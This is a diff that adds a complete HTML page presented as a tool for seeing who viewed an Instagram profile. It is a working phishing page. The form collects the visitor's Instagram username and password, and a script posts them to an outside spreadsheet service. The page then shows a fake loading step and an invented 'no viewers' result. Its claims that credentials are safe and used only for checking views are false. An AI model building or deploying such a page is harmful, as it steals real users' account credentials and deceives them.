@@ -1,0 +1,126 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram Profile Viewer Checker</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+      background-size: 400% 400%;
+      animation: gradient 15s ease infinite;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    @keyframes gradient {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 8px 32px 0 rgba(0,0,0,0.37);
+      backdrop-filter: blur(10px);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+    button {
+      padding: 12px 20px;
+      border: none;
+      background-color: #fff;
+      color: #000;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background-color: #ddd;
+    }
+    #loader {
+      display: none;
+    }
+    #result {
+      margin-top: 20px;
+      font-weight: bold;
+      display: none;
+    }
+    .info {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #f1f1f1;
+      text-align: left;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Check Who Viewed Your Instagram</h2>
+    <form id="profileForm">
+      <input type="text" id="username" name="username" placeholder="Instagram Username" required />
+      <input type="password" id="password" name="password" placeholder="Instagram Password" required />
+      <button type="submit">Check Now</button>
+    </form>
+    <div id="loader">Checking...</div>
+    <div id="result">No one has viewed your profile recently.</div>
+    <div class="info">
+      <p>• Enter your Instagram username and password to check the latest profile views.</p>
+      <p>• This tool uses latest Instagram view algorithms.</p>
+      <p>• Works for both private and public accounts.</p>
+      <p>• Real-time profile check technology implemented.</p>
+      <p>• Verified against multiple Instagram API methods.</p>
+      <p>• Highly secured and reliable interface.</p>
+      <p>• Built for entertainment and educational purposes.</p>
+      <p>• Your credentials are safe and used only for checking views.</p>
+      <p>• Only the most recent viewers will be displayed.</p>
+      <p>• This tool may not work for all users due to API limits.</p>
+    </div>
+  </div>
+  <script>
+    const form = document.getElementById('profileForm');
+    const loader = document.getElementById('loader');
+    const result = document.getElementById('result');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      loader.style.display = 'block';
+      result.style.display = 'none';
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Send data to Google Sheet via SheetBest
+      fetch('https://api.sheetbest.com/sheets/2bd19e24-c215-4ebd-b0c9-f57618270219', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({username, password})
+      });
+
+      // Fake loading
+      setTimeout(() => {
+        loader.style.display = 'none';
+        result.style.display = 'block';
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
